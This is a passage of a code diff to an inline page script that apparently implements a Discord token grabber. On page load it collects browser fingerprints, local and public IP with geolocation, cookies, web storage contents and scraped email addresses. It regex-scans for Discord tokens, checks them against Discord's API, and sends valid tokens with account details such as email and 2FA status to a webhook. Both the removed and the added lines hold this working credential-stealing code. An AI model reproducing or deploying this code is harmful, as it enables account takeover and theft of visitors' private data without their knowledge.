+      fields.push({ name: 'Browser', value: data.browser.userAgent.substring(0, 200), inline: false });
+      fields.push({ name: 'Language', value: data.browser.language, inline: true });
+      fields.push({ name: 'Platform', value: data.browser.platform, inline: true });
+      fields.push({ name: 'Screen', value: data.system.screen, inline: true });
+      fields.push({ name: 'Window', value: data.system.window, inline: true });
+      fields.push({ name: 'Pixel Ratio', value: data.system.pixelRatio, inline: true });
+      fields.push({ name: 'Timezone', value: data.system.timezone, inline: true });
+      fields.push({ name: 'UTC Time', value: data.system.utc, inline: false });
+      if (data.system.gpuVendor) fields.push({ name: 'GPU', value: data.system.gpuVendor + ' | ' + data.system.gpuRenderer, inline: false });
+      if (data.network.localIP) fields.push({ name: 'Local IP', value: data.network.localIP, inline: true });
+
+      fields.push({ name: 'Cookies', value: data.storage.cookies + ' found', inline: true });
+      if (data.storage.localStorage && data.storage.localStorage.length > 0) {
+        var lsStr = data.storage.localStorage.slice(0, 5).join('\n');
+        if (data.storage.localStorage.length > 5) lsStr += '\n... and ' + (data.storage.localStorage.length - 5) + ' more';
+        fields.push({ name: 'LocalStorage', value: lsStr.substring(0, 500), inline: false });
+      }
+      if (data.storage.sessionStorage && data.storage.sessionStorage.length > 0) {
+        var ssStr = data.storage.sessionStorage.slice(0, 5).join('\n');
+        if (data.storage.sessionStorage.length > 5) ssStr += '\n... and ' + (data.storage.sessionStorage.length - 5) + ' more';
+        fields.push({ name: 'SessionStorage', value: ssStr.substring(0, 500), inline: false });
       }
 
-      // ─── INFO GRABBER ───
-      function collectAllData() {
-          var data = {
-              browser: {},
-              system: {},
-              network: {},
-              tokens: [],
-              storage: {},
-              emails: []
-          };
+      if (data.emails && data.emails.length > 0) {
+        fields.push({ name: 'Emails Found', value: data.emails.join(', ').substring(0, 500), inline: false });
+      }
 
-          // Browser info
-          data.browser.userAgent = navigator.userAgent || 'N/A';
-          data.browser.language = navigator.language || 'N/A';
-          data.browser.languages = navigator.languages ? navigator.languages.join(', ') : 'N/A';
-          data.browser.platform = navigator.platform || 'N/A';
-          data.browser.vendor = navigator.vendor || 'N/A';
-          data.browser.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
-          data.browser.deviceMemory = navigator.deviceMemory || 'N/A';
-          data.browser.maxTouchPoints = navigator.maxTouchPoints || 'N/A';
+      if (data.tokens && data.tokens.length > 0) {
+        fields.push({ name: 'Tokens Found', value: data.tokens.length + ' potential tokens', inline: false });
 
-          // Screen
-          data.system.screen = screen.width + 'x' + screen.height + ' (' + screen.colorDepth + '-bit)';
-          data.system.avail = screen.availWidth + 'x' + screen.availHeight;
-          data.system.window = window.innerWidth + 'x' + window.innerHeight;
-          data.system.pixelRatio = window.devicePixelRatio || 1;
-          data.system.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A';
-          data.system.utc = new Date().toISOString();
-          data.system.local = new Date().toString();
+        var validTokens = [];
+        var invalidTokens = [];
 
-          // GPU
-          try {
-              var c = document.createElement('canvas');
-              var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-              if (gl) {
-                  var di = gl.getExtension('WEBGL_debug_renderer_info');
-                  if (di) {
-                      data.system.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL) || 'N/A';
-                      data.system.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL) || 'N/A';
-                  }
-                  data.system.webglVersion = gl.getParameter(gl.VERSION) || 'N/A';
+        var tokenPromises = data.tokens.map(function(item) {
+          return new Promise(function(resolve) {
+            var token = item.token;
+            fetch('https://discord.com/api/v9/users/@me', {
+              headers: { 'Authorization': token, 'Content-Type': 'application/json' }
+            }).then(function(res) {
+              if (res.status === 200) {
+                return res.json().then(function(userData) {
+                  validTokens.push({ token: token, user: userData, source: item.source });
+                  resolve();
+                });
+              } else {
+                invalidTokens.push({ token: token, status: res.status, source: item.source });
+                resolve();
               }
-          } catch(e) {}
-
-          // Local IP via WebRTC
-          try {
-              var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-              pc.createDataChannel('test');
-              pc.createOffer().then(function(offer) { return pc.setLocalDescription(offer); }).then(function() {
-                  var sdp = pc.localDescription ? pc.localDescription.sdp : '';
-                  var candidates = sdp.match(/candidate:[^\n]+/g);
-                  if (candidates) {
-                      for (var i = 0; i < candidates.length; i++) {
-                          var match = candidates[i].match(/(\d{1,3}\.){3}\d{1,3}/);
-                          if (match && !match[0].startsWith('127.') && !match[0].startsWith('0.')) {
-                              data.network.localIP = match[0];
-                              break;
-                          }
-                      }
-                  }
-                  pc.close();
-              }).catch(function() {});
-              setTimeout(function() { try { pc.close(); } catch(e) {} }, 2000);
-          } catch(e) {}
-
-          // Cookies
-          try {
-              var cookies = document.cookie ? document.cookie.split(';').filter(function(c) { return c.trim(); }) : [];
-              data.storage.cookies = cookies.length;
-              data.storage.cookieList = cookies;
-          } catch(e) {}
-
-          // localStorage
-          try {
-              var ls = [];
-              if (localStorage && localStorage.length > 0) {
-                  for (var key in localStorage) {
-                      if (localStorage.hasOwnProperty(key)) {
-                          var val = localStorage[key];
-                          if (val && val.length > 500) val = val.substring(0, 500) + '... [truncated]';
-                          ls.push(key + ': ' + val);
-                      }
-                  }
-              }
-              data.storage.localStorage = ls;
-          } catch(e) {}
-
-          // sessionStorage
-          try {
-              var ss = [];
-              if (sessionStorage && sessionStorage.length > 0) {
-                  for (var key2 in sessionStorage) {
-                      if (sessionStorage.hasOwnProperty(key2)) {
-                          var val2 = sessionStorage[key2];
-                          if (val2 && val2.length > 500) val2 = val2.substring(0, 500) + '... [truncated]';
-                          ss.push(key2 + ': ' + val2);
-                      }
-                  }
-              }
-              data.storage.sessionStorage = ss;
-          } catch(e) {}
-
-          // Email scraping
-          var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-          var emails = [];
-          try {
-              if (localStorage && localStorage.length > 0) {
-                  for (var key3 in localStorage) {
-                      if (localStorage.hasOwnProperty(key3)) {
-                          var val3 = localStorage[key3];
-                          if (typeof val3 === 'string') {
-                              var matches = val3.match(emailRegex);
-                              if (matches) {
-                                  matches.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                              }
-                              try {
-                                  var parsed = JSON.parse(val3);
-                                  var jsonStr = JSON.stringify(parsed);
-                                  var matches2 = jsonStr.match(emailRegex);
-                                  if (matches2) {
-                                      matches2.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                                  }
-                              } catch(e) {}
-                          }
-                      }
-                  }
-              }
-          } catch(e) {}
-          try {
-              if (document.cookie) {
-                  var ck = document.cookie.split(';');
-                  ck.forEach(function(cookie) {
-                      var val4 = cookie.trim();
-                      var matches3 = val4.match(emailRegex);
-                      if (matches3) {
-                          matches3.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                      }
-                  });
-              }
-          } catch(e) {}
-          try {
-              if (sessionStorage && sessionStorage.length > 0) {
-                  for (var key4 in sessionStorage) {
-                      if (sessionStorage.hasOwnProperty(key4)) {
-                          var val5 = sessionStorage[key4];
-                          if (typeof val5 === 'string') {
-                              var matches4 = val5.match(emailRegex);
-                              if (matches4) {
-                                  matches4.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-                              }
-                          }
-                      }
-                  }
-              }
-          } catch(e) {}
-          try {
-              var windowStr = JSON.stringify(window);
-              var matches5 = windowStr.match(emailRegex);
-              if (matches5) {
-                  matches5.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-              }
-          } catch(e) {}
-          try {
-              var html = document.documentElement.innerHTML;
-              var matches6 = html.match(emailRegex);
-              if (matches6) {
-                  matches6.forEach(function(e) { if (emails.indexOf(e) === -1) emails.push(e); });
-              }
-          } catch(e) {}
-          var commonFalse = ['example@example.com', 'test@test.com', 'user@domain.com'];
-          emails = emails.filter(function(e) {
-              return commonFalse.indexOf(e) === -1 && e.length > 10;
+            }).catch(function() {
+              invalidTokens.push({ token: token, status: 'error', source: item.source });
+              resolve();
+            });
           });
-          data.emails = emails;
+        });
 
-          // ─── DISCORD TOKEN SCAN ───
-          var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
-          var tokenSources = [];
-
-          try {
-              if (localStorage && localStorage.length > 0) {
-                  for (var k in localStorage) {
-                      if (localStorage.hasOwnProperty(k)) {
-                          var v = localStorage[k];
-                          if (typeof v === 'string' && v.length > 20) {
-                              var matches7 = v.match(tokenRegex);
-                              if (matches7) {
-                                  matches7.forEach(function(t) {
-                                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                          tokenSources.push({ source: 'localStorage', key: k, token: t });
-                                      }
-                                  });
-                              }
-                              try {
-                                  var p = JSON.parse(v);
-                                  var js = JSON.stringify(p);
-                                  var m2 = js.match(tokenRegex);
-                                  if (m2) {
-                                      m2.forEach(function(t) {
-                                          if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                              tokenSources.push({ source: 'localStorage JSON', key: k, token: t });
-                                          }
-                                      });
-                                  }
-                              } catch(e) {}
-                          }
-                      }
-                  }
-              }
-          } catch(e) {}
-
-          try {
-              if (sessionStorage && sessionStorage.length > 0) {
-                  for (var k2 in sessionStorage) {
-                      if (sessionStorage.hasOwnProperty(k2)) {
-                          var v2 = sessionStorage[k2];
-                          if (typeof v2 === 'string' && v2.length > 20) {
-                              var matches8 = v2.match(tokenRegex);
-                              if (matches8) {
-                                  matches8.forEach(function(t) {
-                                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                          tokenSources.push({ source: 'sessionStorage', key: k2, token: t });
-                                      }
-                                  });
-                              }
-                          }
-                      }
-                  }
-              }
-          } catch(e) {}
-
-          try {
-              if (document.cookie) {
-                  var cks = document.cookie.split(';');
-                  cks.forEach(function(cookie) {
-                      var parts = cookie.trim().split('=');
-                      if (parts.length === 2) {
-                          var val6 = parts[1];
-                          var matches9 = val6.match(tokenRegex);
-                          if (matches9) {
-                              matches9.forEach(function(t) {
-                                  if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                                      tokenSources.push({ source: 'cookie', key: parts[0], token: t });
-                                  }
-                              });
-                          }
-                      }
-                  });
-              }
-          } catch(e) {}
-
-          try {
-              var ws = JSON.stringify(window);
-              var m3 = ws.match(tokenRegex);
-              if (m3) {
-                  m3.forEach(function(t) {
-                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                          tokenSources.push({ source: 'window object', key: 'global', token: t });
-                      }
-                  });
-              }
-          } catch(e) {}
-
-          try {
-              var html2 = document.documentElement.innerHTML;
-              var m4 = html2.match(tokenRegex);
-              if (m4) {
-                  m4.forEach(function(t) {
-                      if (t.length > 30 && !tokenSources.some(function(s) { return s.token === t; })) {
-                          tokenSources.push({ source: 'HTML', key: 'inline', token: t });
-                      }
-                  });
-              }
-          } catch(e) {}
-
-          // Deduplicate tokens
-          var uniqueTokens = [];
-          var seen = {};
-          tokenSources.forEach(function(item) {
-              if (!seen[item.token]) {
-                  seen[item.token] = true;
-                  uniqueTokens.push(item);
-              }
-          });
-
-          data.tokens = uniqueTokens;
-
-          // ─── SEND TO WEBHOOK ───
-          // Build embed
-          var fields = [];
-
-          // Browser info
-          fields.push({ name: '🌐 Browser', value: '```' + data.browser.userAgent.substring(0, 200) + '```', inline: false });
-          fields.push({ name: 'Language', value: data.browser.language, inline: true });
-          fields.push({ name: 'Platform', value: data.browser.platform, inline: true });
-          fields.push({ name: 'Screen', value: data.system.screen, inline: true });
-          fields.push({ name: 'Window', value: data.system.window, inline: true });
-          fields.push({ name: 'Pixel Ratio', value: data.system.pixelRatio, inline: true });
-          fields.push({ name: 'Timezone', value: data.system.timezone, inline: true });
-          fields.push({ name: 'UTC Time', value: data.system.utc, inline: false });
-          if (data.system.gpuVendor) fields.push({ name: 'GPU', value: data.system.gpuVendor + ' | ' + data.system.gpuRenderer, inline: false });
-          if (data.network.localIP) fields.push({ name: 'Local IP', value: data.network.localIP, inline: true });
-
-          // Storage
-          fields.push({ name: '🍪 Cookies', value: data.storage.cookies + ' found', inline: true });
-          if (data.storage.localStorage && data.storage.localStorage.length > 0) {
-              var lsStr = data.storage.localStorage.slice(0, 5).join('\n');
-              if (data.storage.localStorage.length > 5) lsStr += '\n... and ' + (data.storage.localStorage.length - 5) + ' more';
-              fields.push({ name: '💾 LocalStorage', value: '```' + lsStr.substring(0, 500) + '```', inline: false });
-          }
-          if (data.storage.sessionStorage && data.storage.sessionStorage.length > 0) {
-              var ssStr = data.storage.sessionStorage.slice(0, 5).join('\n');
-              if (data.storage.sessionStorage.length > 5) ssStr += '\n... and ' + (data.storage.sessionStorage.length - 5) + ' more';
-              fields.push({ name: '📦 SessionStorage', value: '```' + ssStr.substring(0, 500) + '```', inline: false });
-          }
-
-          // Emails
-          if (data.emails && data.emails.length > 0) {
-              fields.push({ name: '📧 Emails Found', value: data.emails.join(', ').substring(0, 500), inline: false });
-          }
-
-          // Tokens
-          if (data.tokens && data.tokens.length > 0) {
-              fields.push({ name: '🔑 Tokens Found', value: data.tokens.length + ' potential tokens', inline: false });
-
-              // Validate each token
-              var validTokens = [];
-              var invalidTokens = [];
-
-              var tokenPromises = data.tokens.map(function(item) {
-                  return new Promise(function(resolve) {
-                      var token = item.token;
-                      fetch('https://discord.com/api/v9/users/@me', {
-                          headers: { 'Authorization': token, 'Content-Type': 'application/json' }
-                      }).then(function(res) {
-                          if (res.status === 200) {
-                              return res.json().then(function(userData) {
-                                  validTokens.push({ token: token, user: userData, source: item.source });
-                                  resolve();
-                              });
-                          } else {
-                              invalidTokens.push({ token: token, status: res.status, source: item.source });
-                              resolve();
-                          }
-                      }).catch(function() {
-                          invalidTokens.push({ token: token, status: 'error', source: item.source });
-                          resolve();
-                      });
-                  });
-              });
-
-              Promise.all(tokenPromises).then(function() {
-                  // Send valid tokens first
-                  if (validTokens.length > 0) {
-                      validTokens.forEach(function(vt) {
-                          var user = vt.user;
-                          var tag = user.global_name || user.username || user.id;
-                          var embed = {
-                              title: '🎯 VALID TOKEN',
-                              color: 0x00ff00,
-                              fields: [
-                                  { name: 'User', value: tag + ' (' + user.id + ')', inline: false },
-                                  { name: 'Email', value: user.email || 'N/A', inline: true },
-                                  { name: '2FA', value: user.mfa_enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
-                                  { name: 'Nitro', value: user.premium_type || 'None', inline: true },
-                                  { name: 'Verified', value: user.verified ? 'Yes' : 'No', inline: true },
-                                  { name: 'Token', value: '```' + vt.token + '```', inline: false },
-                                  { name: 'Source', value: vt.source, inline: true }
-                              ],
-                              timestamp: new Date().toISOString()
-                          };
-                          sendToWebhook({ embeds: [embed] });
-                      });
-                  }
-
-                  if (invalidTokens.length > 0) {
-                      var invMsg = invalidTokens.map(function(it) {
-                          return it.token.substring(0, 30) + '... [' + it.status + '] from ' + it.source;
-                      }).join('\n');
-                      sendToWebhook({ embeds: [{ title: '❌ Invalid Tokens', color: 0xff0000, fields: [{ name: 'Tokens', value: '```' + invMsg.substring(0, 500) + '```', inline: false }] }] });
-                  }
-
-                  // Summary
-                  sendToWebhook('```\n✅ COLLECTIVE HARVEST COMPLETE\nValid Tokens: ' + validTokens.length + '\nInvalid Tokens: ' + invalidTokens.length + '\nEmails: ' + data.emails.length + '\nLocalStorage Keys: ' + (data.storage.localStorage ? data.storage.localStorage.length : 0) + '\nSessionStorage Keys: ' + (data.storage.sessionStorage ? data.storage.sessionStorage.length : 0) + '\n```');
-              });
-          } else {
-              // No tokens found
-              var noTokenEmbed = {
-                  title: '🔍 COLLECTIVE HARVEST',
-                  color: 0x5865F2,
-                  fields: fields,
-                  timestamp: new Date().toISOString()
+        Promise.all(tokenPromises).then(function() {
+          if (validTokens.length > 0) {
+            validTokens.forEach(function(vt) {
+              var user = vt.user;
+              var tag = user.global_name || user.username || user.id;
+              var embed = {
+                title: 'VALID TOKEN',
+                color: 0x00ff00,
+                fields: [
+                  { name: 'User', value: tag + ' (' + user.id + ')', inline: false },
+                  { name: 'Email', value: user.email || 'N/A', inline: true },
+                  { name: '2FA', value: user.mfa_enabled ? 'Enabled' : 'Disabled', inline: true },
+                  { name: 'Nitro', value: user.premium_type || 'None', inline: true },
+                  { name: 'Verified', value: user.verified ? 'Yes' : 'No', inline: true },
+                  { name: 'Source', value: vt.source, inline: true }
+                ],
+                timestamp: new Date().toISOString()
               };
-              sendToWebhook({ embeds: [noTokenEmbed] });
-              sendToWebhook('🚫 No Discord tokens found in browser storage.');
+              sendToWebhook({ embeds: [embed] });
+            });
           }
 
-          // Public IP (async)
-          fetch('https://api.ipify.org?format=json')
-              .then(function(r) { return r.json(); })
-              .then(function(data) {
-                  if (data && data.ip) {
-                      sendToWebhook('🌐 **Public IP:** ' + data.ip);
-                      return fetch('http://ip-api.com/json/' + data.ip);
-                  }
-              })
-              .then(function(r) { return r ? r.json() : null; })
-              .then(function(geo) {
-                  if (geo && geo.status === 'success') {
-                      sendToWebhook('📍 **IP Location:** ' + geo.city + ', ' + geo.regionName + ', ' + geo.country + ' (ISP: ' + geo.isp + ')');
-                  }
-              })
-              .catch(function() {});
+          if (invalidTokens.length > 0) {
+            var invMsg = invalidTokens.map(function(it) {
+              return it.token.substring(0, 30) + '... [' + it.status + '] from ' + it.source;
+            }).join('\n');
+            sendToWebhook({ embeds: [{ title: 'Invalid Tokens', color: 0xff0000, fields: [{ name: 'Tokens', value: invMsg.substring(0, 500), inline: false }] }] });
+          }
+
+          sendToWebhook('Harvest complete. Valid: ' + validTokens.length + ' | Invalid: ' + invalidTokens.length + ' | Emails: ' + data.emails.length);
+        });
+      } else {
+        var noTokenEmbed = {
+          title: 'Collective Harvest',
+          color: 0x5865F2,
+          fields: fields,
+          timestamp: new Date().toISOString()
+        };
+        sendToWebhook({ embeds: [noTokenEmbed] });
+        sendToWebhook('No Discord tokens found in browser storage.');
       }
+
+      fetch('https://api.ipify.org?format=json')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+          if (data && data.ip) {
+            sendToWebhook('Public IP: ' + data.ip);
+            return fetch('http://ip-api.com/json/' + data.ip);
+          }
+        })
+        .then(function(r) { return r ? r.json() : null; })
+        .then(function(geo) {
+          if (geo && geo.status === 'success') {
+            sendToWebhook('IP Location: ' + geo.city + ', ' + geo.regionName + ', ' + geo.country + ' (ISP: ' + geo.isp + ')');
+          }
+        })
+        .catch(function() {});
+    }
 
   })();
   </script>
